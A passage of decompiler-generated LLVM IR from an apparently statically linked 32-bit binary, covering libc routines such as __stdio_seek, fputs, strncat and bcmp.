  %v4_806610f = call i32 @__stdio_READ(i16* %v3_806610f, i32 %v3_8066104, i32 %v2_806610a)
  %v0_8066114 = load i32, i32* @ebx, align 4
  %v1_8066114 = add i32 %v0_8066114, 8
  %v2_8066114 = inttoptr i32 %v1_8066114 to i32*
  %v3_8066114 = load i32, i32* %v2_8066114, align 4
  store i32 %v3_8066114, i32* %edx.global-to-local, align 4
  %v2_8066117 = add i32 %v0_8066114, 16
  %v3_8066117 = inttoptr i32 %v2_8066117 to i32*
  store i32 %v3_8066114, i32* %v3_8066117, align 4
  %v0_806611a = load i32, i32* %edx.global-to-local, align 4
  %v2_806611a = add i32 %v0_806611a, %v4_806610f
  store i32 %v2_806611a, i32* %edx.global-to-local, align 4
  %v1_806611c = load i32, i32* @ebx, align 4
  %v2_806611c = add i32 %v1_806611c, 20
  %v3_806611c = inttoptr i32 %v2_806611c to i32*
  store i32 %v2_806611a, i32* %v3_806611c, align 4
  store i32 %v0_80660fc, i32* @ebx, align 4
  ret i32 %v4_806610f

; uselistorder directives
  uselistorder i32 %v4_806610f, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_READ, { 2, 3, 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8066130 = add i32 %tmp5, 4
  %v2_8066130 = inttoptr i32 %v1_8066130 to i32*
  %v3_8066130 = load i32, i32* %v2_8066130, align 4
  %v2_8066133 = load i32, i32* %arg2, align 4
  %v1_8066139 = add i32 %arg1, 4
  %v2_8066139 = inttoptr i32 %v1_8066139 to i32*
  %v3_8066139 = load i32, i32* %v2_8066139, align 4
  %v4_806613c = call i32 @__libc_lseek64(i32 %v3_8066139, i32 %v2_8066133, i32 %v3_8066130, i32 %arg3)
  %v0_8066146 = load i32, i32* @edx, align 4
  %v2_8066146 = icmp slt i32 %v0_8066146, 0
  br i1 %v2_8066146, label %dec_label_pc_8066151, label %dec_label_pc_806614a

dec_label_pc_806614a:                             ; preds = %entry
  %v1_806614a = load i32, i32* @ebx, align 4
  %v2_806614a = inttoptr i32 %v1_806614a to i32*
  store i32 %v4_806613c, i32* %v2_806614a, align 4
  %v0_806614c = load i32, i32* @edx, align 4
  %v1_806614c = load i32, i32* @ebx, align 4
  %v2_806614c = add i32 %v1_806614c, 4
  %v3_806614c = inttoptr i32 %v2_806614c to i32*
  store i32 %v0_806614c, i32* %v3_806614c, align 4
  br label %dec_label_pc_8066151

dec_label_pc_8066151:                             ; preds = %entry, %dec_label_pc_806614a
  %v0_8066151 = phi i32 [ %v4_806613c, %entry ], [ 0, %dec_label_pc_806614a ]
  ret i32 %v0_8066151

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 1, 4, 3, 2, 5 }
  uselistorder label %dec_label_pc_8066151, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8066158 = load i32, i32* @edi, align 4
  %v0_8066159 = load i32, i32* @esi, align 4
  %v0_806615a = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_8066162 = add i32 %arg2, 52
  %v2_8066162 = inttoptr i32 %v1_8066162 to i32*
  %v3_8066162 = load i32, i32* %v2_8066162, align 4
  store i32 %v3_8066162, i32* @edi, align 4
  %v1_8066165 = icmp eq i32 %v3_8066162, 0
  %v1_8066167 = icmp eq i1 %v1_8066165, false
  br i1 %v1_8066167, label %entry.dec_label_pc_8066188_crit_edge, label %dec_label_pc_8066169

entry.dec_label_pc_8066188_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8066188

dec_label_pc_8066169:                             ; preds = %entry
  %v1_8066169 = add i32 %arg2, 56
  store i32 %v1_8066169, i32* @ebx, align 4
  %v4_8066178 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_8066169)
  %v0_806617d = load i32, i32* @ebx, align 4
  %v1_8066180 = call i32 @pthread_mutex_lock(i32 %v0_806617d)
  %v0_806618a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066188

dec_label_pc_8066188:                             ; preds = %entry.dec_label_pc_8066188_crit_edge, %dec_label_pc_8066169
  %v0_806618a = phi i32 [ %arg2, %entry.dec_label_pc_8066188_crit_edge ], [ %v0_806618a.pre, %dec_label_pc_8066169 ]
  %v0_8066188 = load i32, i32* @edx, align 4
  %v4_806618f = inttoptr i32 %arg1 to i8*
  %v5_806618f = call i32 @__GI_fputs_unlocked(i8* %v4_806618f, i32 %v0_806618a, i32 %v0_8066188, i32 %v0_8066188)
  store i32 %v5_806618f, i32* @ebx, align 4
  br i1 %v1_8066167, label %dec_label_pc_80661ae, label %dec_label_pc_806619d

dec_label_pc_806619d:                             ; preds = %dec_label_pc_8066188
  %v3_80661a6 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_80661b1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80661ae

dec_label_pc_80661ae:                             ; preds = %dec_label_pc_8066188, %dec_label_pc_806619d
  %v0_80661b1 = phi i32 [ %v5_806618f, %dec_label_pc_8066188 ], [ %v0_80661b1.pre, %dec_label_pc_806619d ]
  store i32 %v0_806615a, i32* @ebx, align 4
  store i32 %v0_8066159, i32* @esi, align 4
  store i32 %v0_8066158, i32* @edi, align 4
  ret i32 %v0_80661b1

; uselistorder directives
  uselistorder i32 (i32*, i32)* @__pthread_cleanup_pop_restore, { 42, 44, 2, 46, 47, 52, 22, 23, 24, 25, 26, 27, 0, 1, 3, 4, 5, 43, 50, 40, 6, 7, 41, 51, 48, 49, 8, 9, 28, 29, 30, 31, 32, 33, 19, 15, 34, 21, 18, 16, 10, 45, 35, 36, 11, 12, 13, 17, 37, 38, 39, 14, 20 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_fputs_unlocked, { 1, 2, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 15, 13, 65, 10, 11, 39, 38, 37, 36, 35, 34, 33, 67, 66, 64, 63, 62, 14, 5, 20, 61, 60, 19, 4, 0, 1, 2, 3, 59, 58, 32, 31, 30, 29, 28, 27, 43, 47, 26, 40, 44, 46, 51, 12, 25, 24, 50, 49, 48, 45, 23, 22, 21, 42, 41, 68, 9, 6, 18, 8, 7, 57, 56, 55, 54, 53, 52, 17, 16 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 43, 45, 2, 48, 47, 22, 23, 24, 25, 26, 27, 28, 0, 1, 3, 4, 5, 44, 49, 41, 6, 7, 42, 52, 51, 50, 8, 9, 29, 30, 31, 32, 33, 34, 18, 14, 35, 21, 17, 15, 10, 46, 36, 37, 11, 12, 13, 16, 38, 39, 40, 19, 20 }
  uselistorder i32 134583465, { 3, 4, 5, 6, 7, 8, 52, 56, 57, 58, 59, 60, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 40, 1, 41, 2, 42, 43, 44, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 45, 53, 46, 54, 47, 48, 51, 35, 36, 49, 50, 37, 38, 39, 55 }
  uselistorder i32 52, { 34, 35, 12, 1, 29, 0, 8, 9, 19, 13, 14, 10, 39, 40, 27, 20, 30, 28, 23, 21, 15, 36, 37, 38, 31, 22, 32, 24, 25, 26, 11, 2, 16, 4, 17, 3, 18, 6, 7, 5, 33 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80661ae, { 1, 0 }
  uselistorder label %dec_label_pc_8066188, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_80661b9 = load i32, i32* @esi, align 4
  store i32 %v0_80661b9, i32* %stack_var_-8, align 4
  %v4_80661ba = ptrtoint i8* %tmp5 to i32
  store i32 %v4_80661ba, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_80661c7 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_80661cb = call i32 @_strlen(i8* %v4_80661c7)
  %v2_80661cd = add i32 %tmp, -1
  store i32 %v2_80661cd, i32* %edi.global-to-local, align 4
  %v0_80661ce = load i32, i32* %edx.global-to-local, align 4
  %v8_80661d113 = icmp eq i32 %v0_80661ce, 0
  store i32 %v0_80661ce, i32* @ecx, align 4
  br i1 %v8_80661d113, label %dec_label_pc_80661dc, label %dec_label_pc_80661d4.lr.ph

dec_label_pc_80661d4.lr.ph:                       ; preds = %entry
  %v4_80661d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_80661d4.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80661d4

dec_label_pc_80661d4:                             ; preds = %dec_label_pc_80661d4.lr.ph, %dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge
  %v8_80661d4 = phi i1 [ %v8_80661d4.pre, %dec_label_pc_80661d4.lr.ph ], [ %v5_80661d5, %dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge ]
  %v4_80661d4 = phi i32 [ %v4_80661d4.pre, %dec_label_pc_80661d4.lr.ph ], [ %v0_80661d6, %dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge ]
  %v2_80661de14 = phi i32 [ %v2_80661cd, %dec_label_pc_80661d4.lr.ph ], [ %v7_80661d5, %dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge ]
  %v0_80661d4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80661d4 = inttoptr i32 %v0_80661d4 to i8*
  %v2_80661d4 = load i8, i8* %v1_80661d4, align 1
  %v3_80661d4 = zext i8 %v2_80661d4 to i32
  %v5_80661d4 = and i32 %v4_80661d4, -256
  %v6_80661d4 = or i32 %v5_80661d4, %v3_80661d4
  store i32 %v6_80661d4, i32* %eax.global-to-local, align 4
  %v9_80661d4 = select i1 %v8_80661d4, i32 -1, i32 1
  %v10_80661d4 = add i32 %v9_80661d4, %v0_80661d4
  store i32 %v10_80661d4, i32* %esi.global-to-local, align 4
  %v3_80661d5 = inttoptr i32 %v2_80661de14 to i8*
  store i8 %v2_80661d4, i8* %v3_80661d5, align 1
  %v4_80661d5 = load i32, i32* %edi.global-to-local, align 4
  %v5_80661d5 = load i1, i1* @df, align 1
  %v6_80661d5 = select i1 %v5_80661d5, i32 -1, i32 1
  %v7_80661d5 = add i32 %v6_80661d5, %v4_80661d5
  store i32 %v7_80661d5, i32* %edi.global-to-local, align 4
  %v0_80661d6 = load i32, i32* %eax.global-to-local, align 4
  %v3_80661d6 = trunc i32 %v0_80661d6 to i8
  %v4_80661d6 = icmp eq i8 %v3_80661d6, 0
  %v1_80661d8 = icmp eq i1 %v4_80661d6, false
  br i1 %v1_80661d8, label %dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge, label %dec_label_pc_80661df

dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge: ; preds = %dec_label_pc_80661d4
  %v0_80661d1.pre = load i32, i32* @ecx, align 4
  %v1_80661d1 = add i32 %v0_80661d1.pre, -1
  %v8_80661d1 = icmp eq i32 %v1_80661d1, 0
  store i32 %v1_80661d1, i32* @ecx, align 4
  br i1 %v8_80661d1, label %dec_label_pc_80661dc, label %dec_label_pc_80661d4

dec_label_pc_80661dc:                             ; preds = %dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge, %entry
  %v2_80661de.lcssa = phi i32 [ %v2_80661cd, %entry ], [ %v7_80661d5, %dec_label_pc_80661d4.dec_label_pc_80661d1_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80661de = inttoptr i32 %v2_80661de.lcssa to i8*
  store i8 0, i8* %v3_80661de, align 1
  %v4_80661de = load i32, i32* %edi.global-to-local, align 4
  %v5_80661de = load i1, i1* @df, align 1
  %v6_80661de = select i1 %v5_80661de, i32 -1, i32 1
  %v7_80661de = add i32 %v6_80661de, %v4_80661de
  store i32 %v7_80661de, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80661df

dec_label_pc_80661df:                             ; preds = %dec_label_pc_80661d4, %dec_label_pc_80661dc
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_80661e3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80661e3, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_80661d1, { 1, 0 }
  uselistorder i32 %v0_80661d6, { 1, 0 }
  uselistorder i32 %v7_80661d5, { 0, 2, 1 }
  uselistorder i1 %v5_80661d5, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* @df, { 79, 80, 0, 9, 81, 10, 82, 83, 48, 84, 1, 2, 3, 91, 92, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 4, 5, 6, 7, 8, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 85, 86, 87, 88, 89, 90 }
  uselistorder label %dec_label_pc_80661df, { 1, 0 }
  uselistorder label %dec_label_pc_80661d4, { 1, 0 }
}

define i32 @memcmp_bytes() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v15_80661e9 = ptrtoint i32* %stack_var_-12 to i32
  %v0_80661ee = load i32, i32* @eax, align 4
  store i32 %v0_80661ee, i32* %stack_var_-8, align 4
  %v0_80661f2 = load i32, i32* @edx, align 4
  store i32 %v0_80661f2, i32* %stack_var_-12, align 4
  %v2_80661f5 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_80661f9

dec_label_pc_80661f9:                             ; preds = %dec_label_pc_80661f9, %entry
  %v0_8066200 = phi i32 [ %v1_8066200, %dec_label_pc_80661f9 ], [ %v15_80661e9, %entry ]
  %v0_80661ff = phi i32 [ %v1_80661ff, %dec_label_pc_80661f9 ], [ %v2_80661f5, %entry ]
  %v1_80661f9 = inttoptr i32 %v0_80661ff to i8*
  %v2_80661f9 = load i8, i8* %v1_80661f9, align 1
  %v3_80661f9 = zext i8 %v2_80661f9 to i32
  %v1_80661fc = inttoptr i32 %v0_8066200 to i8*
  %v2_80661fc = load i8, i8* %v1_80661fc, align 1
  %v3_80661fc = zext i8 %v2_80661fc to i32
  %v1_80661ff = add i32 %v0_80661ff, 1
  %v1_8066200 = add i32 %v0_8066200, 1
  %v2_8066201 = sub nsw i32 %v3_80661f9, %v3_80661fc
  %v12_8066201 = icmp eq i32 %v2_8066201, 0
  br i1 %v12_8066201, label %dec_label_pc_80661f9, label %dec_label_pc_8066205

dec_label_pc_8066205:                             ; preds = %dec_label_pc_80661f9
  store i32 %v0_80661f2, i32* @edx, align 4
  store i32 %v0_80661ee, i32* @ecx, align 4
  ret i32 %v2_8066201

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @bcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_806620e = load i32, i32* @ebx, align 4
  %v4_8066212 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8066212, i32* @ecx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v6_806621f = icmp ugt i32 %arg3, 15
  br i1 %v6_806621f, label %dec_label_pc_806623c.preheader, label %dec_label_pc_806649f.preheader

dec_label_pc_806623c.preheader:                   ; preds = %entry
  %v2_806624048 = urem i32 %arg2, 4
  %v3_806624049 = icmp eq i32 %v2_806624048, 0
  %v1_806624353 = icmp eq i1 %v3_806624049, false
  br i1 %v1_806624353, label %dec_label_pc_8066226, label %dec_label_pc_8066245

dec_label_pc_8066226:                             ; preds = %dec_label_pc_806623c.preheader, %dec_label_pc_8066236
  %v0_806623a = phi i32 [ %v1_806623a, %dec_label_pc_8066236 ], [ %v4_8066212, %dec_label_pc_806623c.preheader ]
  %v0_806623b = phi i32 [ %v1_806623b, %dec_label_pc_8066236 ], [ %arg2, %dec_label_pc_806623c.preheader ]
  %stack_var_12.054 = phi i32 [ %v4_8066236, %dec_label_pc_8066236 ], [ %arg3, %dec_label_pc_806623c.preheader ]
  %v1_8066226 = inttoptr i32 %v0_806623b to i8*
  %v2_8066226 = load i8, i8* %v1_8066226, align 1
  %v3_8066226 = zext i8 %v2_8066226 to i32
  %v1_8066229 = inttoptr i32 %v0_806623a to i8*
  %v2_8066229 = load i8, i8* %v1_8066229, align 1
  %v3_8066229 = zext i8 %v2_8066229 to i32
  %v2_806622c = sub nsw i32 %v3_8066229, %v3_8066226
  %v12_806622c = icmp eq i32 %v2_806622c, 0
  store i32 %v2_806622c, i32* @edx, align 4
  %v1_8066230 = icmp eq i1 %v12_806622c, false
  br i1 %v1_8066230, label %dec_label_pc_80664a8, label %dec_label_pc_8066236

dec_label_pc_8066236:                             ; preds = %dec_label_pc_8066226
  %v4_8066236 = add i32 %stack_var_12.054, -1
  %v1_806623a = add i32 %v0_806623a, 1
  store i32 %v1_806623a, i32* @ecx, align 4
  %v1_806623b = add i32 %v0_806623b, 1
  store i32 %v1_806623b, i32* @ebx, align 4
  %v2_8066240 = urem i32 %v1_806623b, 4
  %v3_8066240 = icmp eq i32 %v2_8066240, 0
  %v1_8066243 = icmp eq i1 %v3_8066240, false
  br i1 %v1_8066243, label %dec_label_pc_8066226, label %dec_label_pc_8066245

dec_label_pc_8066245:                             ; preds = %dec_label_pc_8066236, %dec_label_pc_806623c.preheader
  %v0_806632a = phi i32 [ %v4_8066212, %dec_label_pc_806623c.preheader ], [ %v1_806623a, %dec_label_pc_8066236 ]
  %stack_var_12.0.lcssa = phi i32 [ %arg3, %dec_label_pc_806623c.preheader ], [ %v4_8066236, %dec_label_pc_8066236 ]
  %v0_8066394 = phi i32 [ %arg2, %dec_label_pc_806623c.preheader ], [ %v1_806623b, %dec_label_pc_8066236 ]
  %v1_806624b = urem i32 %v0_806632a, 4
  %v2_806624b = icmp eq i32 %v1_806624b, 0
  %v1_806624e = icmp eq i1 %v2_806624b, false
  %v2_8066314 = udiv i32 %stack_var_12.0.lcssa, 4
  br i1 %v1_806624e, label %dec_label_pc_8066308, label %dec_label_pc_8066254

dec_label_pc_8066254:                             ; preds = %dec_label_pc_8066245
  %v1_806625d = urem i32 %v2_8066314, 4
  %v9_8066260 = icmp eq i32 %v1_806625d, 1
  br i1 %v9_8066260, label %dec_label_pc_8066294, label %dec_label_pc_8066265

dec_label_pc_8066265:                             ; preds = %dec_label_pc_8066254
  %v2_806625d = icmp eq i32 %v1_806625d, 0
  br i1 %v2_806625d, label %dec_label_pc_806628e, label %dec_label_pc_8066267

dec_label_pc_8066267:                             ; preds = %dec_label_pc_8066265
  %v9_8066267 = icmp eq i32 %v1_806625d, 3
  %v1_806626a = inttoptr i32 %v0_806632a to i32*
  %v2_806626a = load i32, i32* %v1_806626a, align 4
  %v1_806626c = inttoptr i32 %v0_8066394 to i32*
  %v2_806626c = load i32, i32* %v1_806626c, align 4
  br i1 %v9_8066267, label %dec_label_pc_806627f, label %dec_label_pc_8066270

dec_label_pc_8066270:                             ; preds = %dec_label_pc_8066267
  %v1_8066272 = add i32 %v0_806632a, -8
  store i32 %v2_806626c, i32* @edx, align 4
  %v1_8066277 = add i32 %v0_8066394, -8
  store i32 %v1_8066277, i32* @ebx, align 4
  %v1_806627a = add nuw nsw i32 %v2_8066314, 2
  br label %dec_label_pc_80662cf

dec_label_pc_806627f:                             ; preds = %dec_label_pc_8066267
  %v1_8066281 = add i32 %v0_806632a, -4
  %v1_8066284 = add i32 %v0_8066394, -4
  store i32 %v1_8066284, i32* @ebx, align 4
  %v1_8066287 = add nuw nsw i32 %v2_8066314, 1
  br label %dec_label_pc_80662bb

dec_label_pc_806628e:                             ; preds = %dec_label_pc_8066265
  %v1_806628e = inttoptr i32 %v0_806632a to i32*
  %v2_806628e = load i32, i32* %v1_806628e, align 4
  store i32 %v2_806628e, i32* @eax, align 4
  %v1_8066290 = inttoptr i32 %v0_8066394 to i32*
  %v2_8066290 = load i32, i32* %v1_8066290, align 4
  store i32 %v2_8066290, i32* @edx, align 4
  br label %dec_label_pc_80662ad

dec_label_pc_8066294:                             ; preds = %dec_label_pc_8066254
  %v1_8066294 = inttoptr i32 %v0_806632a to i32*
  %v2_8066294 = load i32, i32* %v1_8066294, align 4
  %v1_8066296 = add nsw i32 %v2_8066314, -1
  %v1_806629b = add i32 %v0_806632a, 4
  %v1_806629e = inttoptr i32 %v0_8066394 to i32*
  %v2_806629e = load i32, i32* %v1_806629e, align 4
  %v1_80662a0 = add i32 %v0_8066394, 4
  br label %dec_label_pc_80662a3

dec_label_pc_80662a3:                             ; preds = %dec_label_pc_80662e4, %dec_label_pc_8066294
  %v0_80662df75 = phi i32 [ %v1_8066296, %dec_label_pc_8066294 ], [ %v1_80662df, %dec_label_pc_80662e4 ]
  %v4_80662a7 = phi i32 [ %v2_806629e, %dec_label_pc_8066294 ], [ %v3_80662da, %dec_label_pc_80662e4 ]
  %v0_80662a3 = phi i32 [ %v1_806629b, %dec_label_pc_8066294 ], [ %v1_80662e4, %dec_label_pc_80662e4 ]
  %storemerge24.in = phi i32 [ %v1_80662a0, %dec_label_pc_8066294 ], [ %v1_80662e7, %dec_label_pc_80662e4 ]
  %stack_var_-48.0 = phi i32 [ %v2_8066294, %dec_label_pc_8066294 ], [ %v3_80662cf, %dec_label_pc_80662e4 ]
  store i32 %storemerge24.in, i32* @ebx, align 4
  %v1_80662a3 = inttoptr i32 %v0_80662a3 to i32*
  %v2_80662a3 = load i32, i32* %v1_80662a3, align 4
  store i32 %v2_80662a3, i32* @eax, align 4
  %v1_80662a5 = inttoptr i32 %storemerge24.in to i32*
  %v2_80662a5 = load i32, i32* %v1_80662a5, align 4
  store i32 %v2_80662a5, i32* @edx, align 4
  %v15_80662a7 = icmp eq i32 %stack_var_-48.0, %v4_80662a7
  %v1_80662ab = icmp eq i1 %v15_80662a7, false
  br i1 %v1_80662ab, label %dec_label_pc_80662f8, label %dec_label_pc_80662ad

dec_label_pc_80662ad:                             ; preds = %dec_label_pc_80662a3, %dec_label_pc_806628e
  %v0_80662df74 = phi i32 [ %v0_80662df75, %dec_label_pc_80662a3 ], [ %v2_8066314, %dec_label_pc_806628e ]
  %v0_80662b6 = phi i32 [ %storemerge24.in, %dec_label_pc_80662a3 ], [ %v0_8066394, %dec_label_pc_806628e ]
  %v1_80662b0 = phi i32 [ %v2_80662a5, %dec_label_pc_80662a3 ], [ %v2_8066290, %dec_label_pc_806628e ]
  %v0_80662b0 = phi i32 [ %v2_80662a3, %dec_label_pc_80662a3 ], [ %v2_806628e, %dec_label_pc_806628e ]
  %v0_80662ad = phi i32 [ %v0_80662a3, %dec_label_pc_80662a3 ], [ %v0_806632a, %dec_label_pc_806628e ]
  %v1_80662ad = add i32 %v0_80662ad, 4
  %v2_80662ad = inttoptr i32 %v1_80662ad to i32*
  %v3_80662ad = load i32, i32* %v2_80662ad, align 4
  %v12_80662b0 = icmp eq i32 %v0_80662b0, %v1_80662b0
  %v1_80662b6 = add i32 %v0_80662b6, 4
  %v2_80662b6 = inttoptr i32 %v1_80662b6 to i32*
  %v3_80662b6 = load i32, i32* %v2_80662b6, align 4
  %v1_80662b9 = icmp eq i1 %v12_80662b0, false
  br i1 %v1_80662b9, label %dec_label_pc_80662fe, label %dec_label_pc_80662bb

dec_label_pc_80662bb:                             ; preds = %dec_label_pc_80662ad, %dec_label_pc_806627f
  %v0_80662df73 = phi i32 [ %v0_80662df74, %dec_label_pc_80662ad ], [ %v1_8066287, %dec_label_pc_806627f ]
  %v0_80662c7 = phi i32 [ %v3_80662b6, %dec_label_pc_80662ad ], [ %v2_806626c, %dec_label_pc_806627f ]
  %v0_80662be = phi i32 [ %v0_80662b6, %dec_label_pc_80662ad ], [ %v1_8066284, %dec_label_pc_806627f ]
  %v0_80662bb = phi i32 [ %v0_80662ad, %dec_label_pc_80662ad ], [ %v1_8066281, %dec_label_pc_806627f ]
  %stack_var_-20.0 = phi i32 [ %v3_80662ad, %dec_label_pc_80662ad ], [ %v2_806626a, %dec_label_pc_806627f ]
  %v1_80662bb = add i32 %v0_80662bb, 8
  %v2_80662bb = inttoptr i32 %v1_80662bb to i32*
  %v3_80662bb = load i32, i32* %v2_80662bb, align 4
  %v1_80662be = add i32 %v0_80662be, 8
  %v2_80662be = inttoptr i32 %v1_80662be to i32*
  %v3_80662be = load i32, i32* %v2_80662be, align 4
  store i32 %v3_80662be, i32* @edx, align 4
  %v15_80662c1 = icmp eq i32 %stack_var_-20.0, %v0_80662c7
  br i1 %v15_80662c1, label %dec_label_pc_80662cf, label %dec_label_pc_80662c7

dec_label_pc_80662c7:                             ; preds = %dec_label_pc_80662bb
  store i32 %v0_80662c7, i32* @edx, align 4
  store i32 %stack_var_-20.0, i32* @eax, align 4
  br label %dec_label_pc_80662fe

dec_label_pc_80662cf:                             ; preds = %dec_label_pc_80662bb, %dec_label_pc_8066270
  %v0_80662df = phi i32 [ %v0_80662df73, %dec_label_pc_80662bb ], [ %v1_806627a, %dec_label_pc_8066270 ]
  %v0_80662e7 = phi i32 [ %v0_80662be, %dec_label_pc_80662bb ], [ %v1_8066277, %dec_label_pc_8066270 ]
  %v1_80662d2 = phi i32 [ %v3_80662be, %dec_label_pc_80662bb ], [ %v2_806626c, %dec_label_pc_8066270 ]
  %v0_80662d8 = phi i32 [ %v3_80662bb, %dec_label_pc_80662bb ], [ %v2_806626a, %dec_label_pc_8066270 ]
  %v0_80662e4 = phi i32 [ %v0_80662bb, %dec_label_pc_80662bb ], [ %v1_8066272, %dec_label_pc_8066270 ]
  %v1_80662cf = add i32 %v0_80662e4, 12
  %v2_80662cf = inttoptr i32 %v1_80662cf to i32*
  %v3_80662cf = load i32, i32* %v2_80662cf, align 4
  %v12_80662d2 = icmp eq i32 %v0_80662d8, %v1_80662d2
  store i32 %v0_80662d8, i32* @eax, align 4
  %v1_80662da = add i32 %v0_80662e7, 12
  %v2_80662da = inttoptr i32 %v1_80662da to i32*
  %v3_80662da = load i32, i32* %v2_80662da, align 4
  %v1_80662dd = icmp eq i1 %v12_80662d2, false
  br i1 %v1_80662dd, label %dec_label_pc_80662fe, label %dec_label_pc_80662df

dec_label_pc_80662df:                             ; preds = %dec_label_pc_80662cf
  %v1_80662df = add i32 %v0_80662df, -4
  %v9_80662df = icmp eq i32 %v1_80662df, 0
  br i1 %v9_80662df, label %dec_label_pc_80662ec, label %dec_label_pc_80662e4

dec_label_pc_80662e4:                             ; preds = %dec_label_pc_80662df
  %v1_80662e4 = add i32 %v0_80662e4, 16
  %v1_80662e7 = add i32 %v0_80662e7, 16
  br label %dec_label_pc_80662a3

dec_label_pc_80662ec:                             ; preds = %dec_label_pc_80662df
  %v15_80662ee = icmp eq i32 %v3_80662cf, %v3_80662da
  br i1 %v15_80662ee, label %dec_label_pc_806646f.thread, label %dec_label_pc_80662f8

dec_label_pc_806646f.thread:                      ; preds = %dec_label_pc_80662ec
  br label %dec_label_pc_8066473

dec_label_pc_80662f8:                             ; preds = %dec_label_pc_80662ec, %dec_label_pc_80662a3
  %v0_80662f8 = phi i32 [ %v4_80662a7, %dec_label_pc_80662a3 ], [ %v3_80662da, %dec_label_pc_80662ec ]
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_80662a3 ], [ %v3_80662cf, %dec_label_pc_80662ec ]
  store i32 %v0_80662f8, i32* @edx, align 4
  store i32 %stack_var_-48.1, i32* @eax, align 4
  br label %dec_label_pc_80662fe

dec_label_pc_80662fe:                             ; preds = %dec_label_pc_80662cf, %dec_label_pc_80662ad, %dec_label_pc_80662c7, %dec_label_pc_80662f8
  %v0_80662fe = call i32 @memcmp_bytes()
  br label %dec_label_pc_806646f

dec_label_pc_8066308:                             ; preds = %dec_label_pc_8066245
  %v2_8066317 = mul nuw nsw i32 %v1_806624b, 8
  %v6_806631e = sub nsw i32 32, %v2_8066317
  %v1_806632c = urem i32 %v2_8066314, 4
  %v1_806632f = and i32 %v0_806632a, -4
  store i32 %v1_806632f, i32* @edx, align 4
  %v9_8066332 = icmp eq i32 %v1_806632c, 1
  br i1 %v9_8066332, label %dec_label_pc_8066382, label %dec_label_pc_8066337

dec_label_pc_8066337:                             ; preds = %dec_label_pc_8066308
  %v2_806632c = icmp eq i32 %v1_806632c, 0
  br i1 %v2_806632c, label %dec_label_pc_8066372, label %dec_label_pc_8066339

dec_label_pc_8066339:                             ; preds = %dec_label_pc_8066337
  %v9_8066339 = icmp eq i32 %v1_806632c, 3
  %v1_806633c = inttoptr i32 %v1_806632f to i32*
  %v2_806633c = load i32, i32* %v1_806633c, align 4
  %v1_806633e = inttoptr i32 %v0_8066394 to i32*
  %v2_806633e = load i32, i32* %v1_806633e, align 4
  %v1_8066340 = add i32 %v1_806632f, 4
  %v2_8066340 = inttoptr i32 %v1_8066340 to i32*
